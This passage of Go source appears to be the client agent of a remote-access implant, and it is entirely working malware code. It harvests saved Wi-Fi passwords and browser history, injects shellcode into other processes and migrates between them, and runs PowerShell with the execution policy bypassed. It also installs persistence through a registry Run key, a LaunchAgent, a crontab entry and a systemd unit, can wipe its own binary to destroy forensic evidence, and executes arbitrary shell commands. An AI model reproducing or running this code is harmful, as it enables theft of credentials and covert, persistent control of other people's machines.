			pw, _ := exec.Command("security", "find-generic-password",
				"-D", "AirPort network password", "-a", ssid, "-w").Output()
			fmt.Fprintf(&sb, "  SSID: %-32s  KEY: %s\n", ssid, strings.TrimSpace(string(pw)))
		}
		return sb.String()

	default:
		// Linux: NetworkManager
		nmDir := "/etc/NetworkManager/system-connections"
		entries, err := os.ReadDir(nmDir)
		if err != nil {
			wpa, e := os.ReadFile("/etc/wpa_supplicant/wpa_supplicant.conf")
			if e != nil {
				return fmt.Sprintf("[-] %v and no wpa_supplicant.conf found", err)
			}
			return string(wpa)
		}
		var sb strings.Builder
		for _, e := range entries {
			content, err := os.ReadFile(filepath.Join(nmDir, e.Name()))
			if err != nil {
				fmt.Fprintf(&sb, "  %s: permission denied\n", e.Name())
				continue
			}
			ssid, psk := "", ""
			for _, l := range strings.Split(string(content), "\n") {
				if strings.HasPrefix(l, "ssid=") {
					ssid = strings.TrimPrefix(l, "ssid=")
				} else if strings.HasPrefix(l, "psk=") {
					psk = strings.TrimPrefix(l, "psk=")
				}
			}
			fmt.Fprintf(&sb, "  SSID: %-32s  PSK: %s\n", ssid, psk)
		}
		return sb.String()
	}
}

func doBrowserHistory(limit int) string {
	home, _ := os.UserHomeDir()
	type dbEntry struct {
		browser string
		path    string
		isFF    bool
	}
	var dbs []dbEntry

	// Chrome
	for _, d := range []string{
		filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "History"),
		filepath.Join(home, ".config", "google-chrome", "Default", "History"),
		filepath.Join(home, "Library", "Application Support", "Google", "Chrome", "Default", "History"),
	} {
		if _, err := os.Stat(d); err == nil {
			dbs = append(dbs, dbEntry{"Chrome", d, false})
		}
	}
	// Edge
	for _, d := range []string{
		filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "History"),
		filepath.Join(home, ".config", "microsoft-edge", "Default", "History"),
	} {
		if _, err := os.Stat(d); err == nil {
			dbs = append(dbs, dbEntry{"Edge", d, false})
		}
	}
	// Firefox
	for _, base := range []string{
		filepath.Join(home, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles"),
		filepath.Join(home, ".mozilla", "firefox"),
		filepath.Join(home, "Library", "Application Support", "Firefox", "Profiles"),
	} {
		if entries, err := os.ReadDir(base); err == nil {
			for _, e := range entries {
				p := filepath.Join(base, e.Name(), "places.sqlite")
				if _, err := os.Stat(p); err == nil {
					dbs = append(dbs, dbEntry{"Firefox", p, true})
				}
			}
		}
	}

	if len(dbs) == 0 {
		return "[-] No browser history databases found"
	}

	// We can't easily query SQLite without CGO. We use the `sqlite3` CLI if available.
	var sb strings.Builder
	fmt.Fprintf(&sb, "  %-8s  %-20s  %s\n  %s\n", "BROWSER", "TIME (UTC)", "URL", strings.Repeat("─", 80))

	for _, db := range dbs {
		tmp := db.path + "_go_tmp"
		if err := copyFile(db.path, tmp); err != nil {
			fmt.Fprintf(&sb, "  %s: could not copy db (%v)\n", db.browser, err)
			continue
		}
		defer os.Remove(tmp)

		var query string
		if !db.isFF {
			query = fmt.Sprintf(
				`SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch'), url `+
					`FROM urls ORDER BY last_visit_time DESC LIMIT %d`, limit)
		} else {
			query = fmt.Sprintf(
				`SELECT datetime(last_visit_date/1000000,'unixepoch'), url `+
					`FROM moz_places WHERE last_visit_date IS NOT NULL `+
					`ORDER BY last_visit_date DESC LIMIT %d`, limit)
		}

		out, err := exec.Command("sqlite3", "-separator", "\t", tmp, query).Output()
		if err != nil {
			fmt.Fprintf(&sb, "  %s: sqlite3 CLI not found or query failed\n", db.browser)
			continue
		}
		for _, line := range strings.Split(strings.TrimSpace(string(out)), "\n") {
			cols := strings.SplitN(line, "\t", 2)
			if len(cols) == 2 {
				url := cols[1]
				if len(url) > 90 {
					url = url[:90]
				}
				fmt.Fprintf(&sb, "  %-8s  %-20s  %s\n", db.browser, cols[0], url)
			}
		}
	}
	return sb.String()
}

// ---------------------------------------------------------------------------
// Idle time
// ---------------------------------------------------------------------------

func doIdleTime() string {
	switch runtime.GOOS {
	case "windows":
		out, err := exec.Command("powershell", "-NoProfile", "-NonInteractive",
			"-command",
			`$t=New-Object System.Windows.Forms.Application;`+
				`Add-Type -AssemblyName System.Windows.Forms;`+
				`[System.Windows.Forms.SystemInformation]::IdleTime.TotalSeconds`).Output()
		if err != nil {
			// Fallback: use GetLastInputInfo via powershell P/Invoke
			out, err = exec.Command("powershell", "-command",
				`$sig='[DllImport("user32.dll")]public static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);`+
					`[StructLayout(LayoutKind.Sequential)]public struct LASTINPUTINFO{public uint cbSize;public uint dwTime;}';`+
					`Add-Type -MemberDefinition $sig -Name U -Namespace W;`+
					`$l=New-Object W.U+LASTINPUTINFO;$l.cbSize=[System.Runtime.InteropServices.Marshal]::SizeOf($l);`+
					`[W.U]::GetLastInputInfo([ref]$l);`+
					`([System.Environment]::TickCount-$l.dwTime)/1000`).Output()
			if err != nil {
				return fmt.Sprintf("[-] idle_time: %v", err)
			}
		}
		secs := strings.TrimSpace(string(out))
		return "[*] Idle for " + secs + "s"

	case "darwin":
		out, err := exec.Command("bash", "-c",
			`ioreg -c IOHIDSystem | awk '/HIDIdleTime/{print int($NF/1000000000)}'`).Output()
		if err != nil {
			return fmt.Sprintf("[-] idle_time: %v", err)
		}
		return "[*] Idle for " + strings.TrimSpace(string(out)) + "s"

	default:
		if _, err := exec.LookPath("xprintidle"); err == nil {
			out, err := exec.Command("xprintidle").Output()
			if err == nil {
				ms, _ := strconv.Atoi(strings.TrimSpace(string(out)))
				return fmt.Sprintf("[*] Idle for %ds", ms/1000)
			}
		}
		return "[-] xprintidle not found"
	}
}

// ---------------------------------------------------------------------------
// Message box
// ---------------------------------------------------------------------------

func doMsgbox(title, message string) string {
	switch runtime.GOOS {
	case "windows":
		ps := fmt.Sprintf(`[System.Windows.Forms.MessageBox]::Show('%s','%s',0,64)`,
			strings.ReplaceAll(message, "'", "''"),
			strings.ReplaceAll(title, "'", "''"))
		go exec.Command("powershell", "-NoProfile", "-NonInteractive",
			"-command", `Add-Type -AssemblyName System.Windows.Forms; `+ps).Run()
		return "[+] Message box shown"

	case "darwin":
		script := fmt.Sprintf(`display dialog "%s" with title "%s" buttons {"OK"}`, message, title)
		go exec.Command("osascript", "-e", script).Run()
		return "[+] Message box shown"

	default:
		for _, args := range [][]string{
			{"zenity", "--info", "--title=" + title, "--text=" + message, "--no-wrap"},
			{"kdialog", "--title", title, "--msgbox", message},
			{"xmessage", "-title", title, message},
		} {
			if _, e := exec.LookPath(args[0]); e == nil {
				go exec.Command(args[0], args[1:]...).Run()
				return "[+] Message box shown via " + args[0]
			}
		}
		return "[-] No GUI dialog tool found"
	}
}

// ---------------------------------------------------------------------------
// Shellcode injection (Windows only)
// ---------------------------------------------------------------------------

func doInjectShellcode(pidStr, hexSC string) string {
	if runtime.GOOS != "windows" {
		return "[-] inject_shellcode is Windows-only"
	}
	// Delegate to a PowerShell one-liner that calls VirtualAllocEx + WriteProcessMemory
	// + CreateRemoteThread via P/Invoke — pure Go cannot call WinAPI without CGO.
	sc, err := hex.DecodeString(hexSC)
	if err != nil {
		return "[-] Invalid hex shellcode: " + err.Error()
	}
	hexParts := make([]string, len(sc))
	for i, b := range sc {
		hexParts[i] = fmt.Sprintf("0x%02x", b)
	}
	scLiteral := "[byte[]]@(" + strings.Join(hexParts, ",") + ")"
	ps := fmt.Sprintf(
		`$sig='[DllImport("kernel32.dll")]public static extern IntPtr OpenProcess(uint a,bool b,uint c);`+
			`[DllImport("kernel32.dll")]public static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,uint s,uint t,uint p);`+
			`[DllImport("kernel32.dll")]public static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[] b,uint s,out uint w);`+
			`[DllImport("kernel32.dll")]public static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr a,uint s,IntPtr f,IntPtr p,uint c,IntPtr t)';`+
			`Add-Type -MemberDefinition $sig -Name K -Namespace W;`+
			`$h=[W.K]::OpenProcess(0x1F0FFF,$false,%s);`+
			`$m=[W.K]::VirtualAllocEx($h,[IntPtr]::Zero,%d,0x3000,0x40);`+
			`$sc=%s;$w=0;[W.K]::WriteProcessMemory($h,$m,$sc,%d,[ref]$w)|Out-Null;`+
			`$t=[W.K]::CreateRemoteThread($h,[IntPtr]::Zero,0,$m,[IntPtr]::Zero,0,[IntPtr]::Zero);`+
			`"[+] Thread handle: $t"`,
		pidStr, len(sc), scLiteral, len(sc))
	out, err := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-command", ps).Output()
	if err != nil {
		return fmt.Sprintf("[-] inject failed: %v", err)
	}
	return strings.TrimSpace(string(out))
}

// ---------------------------------------------------------------------------
// Process migration
// ---------------------------------------------------------------------------

func doMigrate(conn net.Conn, pidStr string) string {
	if _, err := strconv.Atoi(pidStr); err != nil {
		return "[-] invalid PID"
	}

	// Get our own executable path
	exe, err := os.Executable()
	if err != nil {
		return fmt.Sprintf("[-] migrate: cannot resolve exe path: %v", err)
	}

	if runtime.GOOS == "windows" {
		// On Windows: inject a LoadLibrary-style bootstrap via PowerShell P/Invoke
		// (mirrors the C agent's migrate_to_pid approach)
		ps := fmt.Sprintf(
			`$sig='[DllImport("kernel32.dll")]public static extern IntPtr OpenProcess(uint a,bool b,uint c);`+
				`[DllImport("kernel32.dll")]public static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,uint s,uint t,uint p);`+
				`[DllImport("kernel32.dll")]public static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[] b,uint s,out uint w);`+
				`[DllImport("kernel32.dll")]public static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr a,uint s,IntPtr f,IntPtr p,uint c,IntPtr t);`+
				`[DllImport("kernel32.dll",CharSet=CharSet.Ansi)]public static extern IntPtr LoadLibraryA(string n);`+
				`[DllImport("kernel32.dll",CharSet=CharSet.Ansi)]public static extern IntPtr GetProcAddress(IntPtr h,string n)';`+
				`Add-Type -MemberDefinition $sig -Name K -Namespace W;`+
				`$ph=[W.K]::OpenProcess(0x1F0FFF,$false,%s);`+
				`$pathBytes=[System.Text.Encoding]::ASCII.GetBytes('%s`+"\x00"+`');`+
				`$rm=[W.K]::VirtualAllocEx($ph,[IntPtr]::Zero,$pathBytes.Length,0x3000,0x04);`+
				`$w=0;[W.K]::WriteProcessMemory($ph,$rm,$pathBytes,$pathBytes.Length,[ref]$w)|Out-Null;`+
				`$k32=[W.K]::LoadLibraryA('kernel32.dll');`+
				`$lla=[W.K]::GetProcAddress($k32,'LoadLibraryA');`+
				`$t=[W.K]::CreateRemoteThread($ph,[IntPtr]::Zero,0,$lla,$rm,0,[IntPtr]::Zero);`+
				`"[+] migrate: agent injected into PID %s"`,
			pidStr, exe, pidStr)
		out, err := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-command", ps).Output()
		if err != nil {
			return fmt.Sprintf("[-] migrate: %v", err)
		}
		result := strings.TrimSpace(string(out))
		// Give the new instance a moment then exit
		go func() {
			time.Sleep(1 * time.Second)
			os.Exit(0)
		}()
		return result
	}

	// Linux / macOS: spawn a new detached copy of ourselves
	// (mirrors meterp.py _migrate_posix logic)
	cmd := exec.Command(exe)
	cmd.SysProcAttr = detachSysProcAttr()
	cmd.Env = os.Environ()
	if err := cmd.Start(); err != nil {
		return fmt.Sprintf("[-] migrate (posix spawn): %v", err)
	}
	newPID := cmd.Process.Pid
	cmd.Process.Release()

	go func() {
		time.Sleep(800 * time.Millisecond)
		os.Exit(0)
	}()

	return fmt.Sprintf("[+] migrate: new agent spawned as PID %d — terminating current process", newPID)
}

// ---------------------------------------------------------------------------
// PowerShell execution
// ---------------------------------------------------------------------------

func doRunPsh(command string) string {
	if runtime.GOOS != "windows" {
		return "[-] run_psh is Windows-only"
	}
	out, err := exec.Command("powershell", "-NoProfile", "-NonInteractive",
		"-ExecutionPolicy", "Bypass", "-command", command).CombinedOutput()
	if err != nil {
		return fmt.Sprintf("[-] run_psh: %v\n%s", err, strings.TrimSpace(string(out)))
	}
	s := strings.TrimSpace(string(out))
	if s == "" {
		return "(no output)"
	}
	return s
}

// ---------------------------------------------------------------------------
// Persistence
// ---------------------------------------------------------------------------

func doPersist(regName, fileName string) string {
	exe, err := os.Executable()
	if err != nil {
		return fmt.Sprintf("[-] persist: cannot resolve exe: %v", err)
	}

	switch runtime.GOOS {
	case "windows":
		appData := os.Getenv("APPDATA")
		dst := filepath.Join(appData, fileName)
		if _, err := os.Stat(dst); err == nil {
			return "[-] Already exists"
		}
		if err := copyFile(exe, dst); err != nil {
			return fmt.Sprintf("[-] copy failed: %v", err)
		}
		cmd := fmt.Sprintf(`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%s" /t REG_SZ /d "%s" /f`, regName, dst)
		shellExec(cmd)
		return "[+] Persistence installed (Windows registry Run key)"

	case "darwin":
		launchAgents := filepath.Join(os.Getenv("HOME"), "Library", "LaunchAgents")
		os.MkdirAll(launchAgents, 0755)
		plistPath := filepath.Join(launchAgents, "com."+regName+".plist")
		if _, err := os.Stat(plistPath); err == nil {
			return "[-] LaunchAgent already exists: " + plistPath
		}
		plist := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key><string>com.%s</string>
    <key>ProgramArguments</key><array><string>%s</string></array>
    <key>RunAtLoad</key><true/>
    <key>KeepAlive</key><true/>
    <key>StandardOutPath</key><string>/dev/null</string>
    <key>StandardErrorPath</key><string>/dev/null</string>
</dict>
</plist>`, regName, exe)
		if err := os.WriteFile(plistPath, []byte(plist), 0644); err != nil {
			return fmt.Sprintf("[-] plist write: %v", err)
		}
		exec.Command("launchctl", "load", "-w", plistPath).Run()
		return "[+] Persistence installed (macOS LaunchAgent: " + plistPath + ")"

	default:
		var msgs []string
		// Crontab @reboot
		existing, _ := exec.Command("crontab", "-l").Output()
		entry := "@reboot " + exe + " >/dev/null 2>&1\n"
		if !strings.Contains(string(existing), exe) {
			newCron := strings.TrimRight(string(existing), "\n") + "\n" + entry
			tmp, _ := os.CreateTemp("", "cron*.txt")
			tmp.WriteString(newCron)
			tmp.Close()
			if err := exec.Command("crontab", tmp.Name()).Run(); err == nil {
				msgs = append(msgs, "[+] Crontab @reboot entry added")
			}
			os.Remove(tmp.Name())
		} else {
			msgs = append(msgs, "[*] Crontab entry already present")
		}
		// systemd user service
		svcDir := filepath.Join(os.Getenv("HOME"), ".config", "systemd", "user")
		os.MkdirAll(svcDir, 0755)
		unitPath := filepath.Join(svcDir, regName+".service")
		if _, err := os.Stat(unitPath); err != nil {
			unit := fmt.Sprintf("[Unit]\nDescription=%s\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=%s\nRestart=always\nRestartSec=30\n\n[Install]\nWantedBy=default.target\n", regName, exe)
			if err := os.WriteFile(unitPath, []byte(unit), 0644); err == nil {
				exec.Command("systemctl", "--user", "daemon-reload").Run()
				exec.Command("systemctl", "--user", "enable", "--now", regName+".service").Run()
				msgs = append(msgs, "[+] systemd user service installed: "+unitPath)
			}
		} else {
			msgs = append(msgs, "[*] systemd unit already exists: "+unitPath)
		}
		if len(msgs) == 0 {
			return "[-] No persistence methods succeeded"
		}
		return strings.Join(msgs, "\n")
	}
}

// ---------------------------------------------------------------------------
// Self-destruct
// ---------------------------------------------------------------------------

func doSelfDestruct() {
	if runtime.GOOS == "windows" {
		exec.Command("reg", "delete",
			`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/f").Run()
	}
	exe, err := os.Executable()
	if err == nil {
		// Overwrite file contents with zeros to wipe forensic evidence
		if f, err := os.OpenFile(exe, os.O_WRONLY, 0); err == nil {
			fi, _ := f.Stat()
			zeros := make([]byte, fi.Size())
			f.Write(zeros)
			f.Close()
		}
		os.Remove(exe)
	}
	go func() {
		time.Sleep(500 * time.Millisecond)
		os.Exit(0)
	}()
}

// ---------------------------------------------------------------------------
// Shell execution
// ---------------------------------------------------------------------------

func shellExec(cmd string) string {
	var c *exec.Cmd
	if runtime.GOOS == "windows" {
		c = exec.Command("cmd", "/C", cmd)
	} else {
		c = exec.Command("sh", "-c", cmd)
	}

	wd, _ := os.Getwd()
	c.Dir = wd

	var out bytes.Buffer
	c.Stdout = &out
	c.Stderr = &out

	done := make(chan error, 1)
	go func() { done <- c.Run() }()

	select {
	case <-done:
	case <-time.After(60 * time.Second):
		c.Process.Kill()
		return "[-] Command timed out (60s)"
	}

	// Sanitize output — ensure valid UTF-8
	result := out.String()
	if !utf8.ValidString(result) {
		result = strings.ToValidUTF8(result, "?")
	}
	result = strings.TrimSpace(result)
	if result == "" {
		return "(no output)"
	}
	return result
}

// ---------------------------------------------------------------------------
// Utilities
// ---------------------------------------------------------------------------

func tmpFile(pattern string) string {
	f, err := os.CreateTemp("", pattern)
	if err != nil {
		return os.TempDir() + string(os.PathSeparator) + pattern
	}
	name := f.Name()
	f.Close()
	os.Remove(name) // remove so the tool can create it
	return name
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.OpenFile(dst, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0755)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, in)
	return err
}
